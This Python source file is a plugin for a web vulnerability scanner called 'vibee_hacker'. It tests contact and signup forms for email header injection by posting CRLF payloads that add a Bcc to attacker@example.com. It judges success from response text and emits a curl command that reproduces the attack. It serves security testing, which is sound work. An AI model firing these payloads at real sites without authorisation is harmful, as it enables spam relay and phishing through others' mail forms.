# vibee_hacker/plugins/blackbox/email_injection.py
"""Email Header Injection detection plugin."""

from __future__ import annotations

import shlex
from urllib.parse import urlparse

import httpx

from vibee_hacker.core.models import Target, Result, Severity, InterPhaseContext
from vibee_hacker.core.plugin_base import PluginBase

# Common form parameter names that contain email addresses
EMAIL_PARAM_NAMES = ["email", "mail", "to", "from", "reply_to", "replyto", "contact", "newsletter"]

# CRLF injection payloads that attempt to add extra headers
INJECTION_PAYLOADS = [
    "attacker@example.com\r\nBcc: attacker@example.com",
    "attacker@example.com%0d%0aBcc:attacker@example.com",
    "attacker@example.com\nBcc: attacker@example.com",
    "attacker@example.com%0aBcc:attacker@example.com",
]

# Signals in the response that suggest injection worked
SUCCESS_INDICATORS = [
    "thank you",
    "message sent",
    "email sent",
    "success",
    "submitted",
    "we'll be in touch",
    "confirmation",
]

ERROR_INDICATORS = [
    "invalid email",
    "invalid address",
    "error",
    "failed",
    "not valid",
    "please enter a valid",
]

# Common form-submission paths to probe when the root URL has no forms
PROBE_PATHS = [
    "/contact",
    "/contact-us",
    "/subscribe",
    "/newsletter",
    "/register",
    "/signup",
    "/feedback",
]


def _base_url(url: str) -> str:
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


class EmailInjectionPlugin(PluginBase):
    name = "email_injection"
    description = "Email Header Injection — CRLF in email fields to add BCC/CC headers"
    category = "blackbox"
    phase = 3
    base_severity = Severity.HIGH
    destructive_level = 1
    detection_criteria = (
        "Server returns a success response (200/302) when an email parameter "
        "contains CRLF characters, indicating injected headers may have been processed"
    )
    expected_evidence = "Success response body after submitting CRLF payload in email field"

    async def run(self, target: Target, context: InterPhaseContext | None = None) -> list[Result]:
        if not target.url:
            return []

        base = _base_url(target.url)

        # Build list of URLs to probe for forms
        urls_to_test: list[str] = [target.url]
        if context:
            for crawled_url in (context.crawl_urls or [])[:15]:
                if crawled_url not in urls_to_test:
                    urls_to_test.append(crawled_url)

        for probe_path in PROBE_PATHS:
            probe_url = base + probe_path
            if probe_url not in urls_to_test:
                urls_to_test.append(probe_url)

        # Collect (url, param_name) pairs to test from crawled form data
        test_cases: list[tuple[str, str]] = []

        if context and context.crawl_forms:
            for form in context.crawl_forms[:10]:
                form_url = form.get("action", target.url) or target.url
                for field in form.get("inputs", []):
                    field_name = (field.get("name") or "").lower()
                    if field_name in EMAIL_PARAM_NAMES:
                        test_cases.append((form_url, field.get("name", field_name)))

        # Fallback: probe known param names on discovered URLs
        if not test_cases:
            for url in urls_to_test[:5]:
                for param_name in EMAIL_PARAM_NAMES[:3]:
                    test_cases.append((url, param_name))

        async with httpx.AsyncClient(
            verify=target.verify_ssl,
            timeout=10,
            follow_redirects=False,
        ) as client:
            for form_url, param_name in test_cases:
                for payload in INJECTION_PAYLOADS:
                    data = {param_name: payload, "message": "test", "name": "test"}
                    try:
                        resp = await client.post(form_url, data=data)
                    except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                        continue

                    if resp.status_code not in (200, 201, 302):
                        continue

                    body_lower = resp.text.lower()

                    # Skip if the server returned an obvious validation error
                    if any(err in body_lower for err in ERROR_INDICATORS):
                        continue

                    # Positive signal: success message or redirect (form processed)
                    if resp.status_code == 302 or any(
                        sig in body_lower for sig in SUCCESS_INDICATORS
                    ):
                        return [Result(
                            plugin_name=self.name,
                            base_severity=self.base_severity,
                            title=f"Email Header Injection in parameter '{param_name}'",
                            description=(
                                f"The form field '{param_name}' accepted a payload containing "
                                f"CRLF characters ('\\r\\n') and the server returned a success "
                                f"response. If the application passes this value directly to a "
                                f"mail function, the injected headers (e.g., Bcc) will be "
                                f"processed, enabling spam relay or phishing attacks."
                            ),
                            evidence=(
                                f"Payload '{payload[:60]}' accepted without validation | "
                                f"Status: {resp.status_code} | Endpoint: {form_url}"
                            ),
                            cwe_id="CWE-93",
                            endpoint=form_url,
                            param_name=param_name,
                            curl_command=(
                                f"curl -X POST {shlex.quote(form_url)} "
                                f"-d '{param_name}={shlex.quote(payload)}'"
                            ),
                            rule_id="email_header_injection",
                        )]

        return []
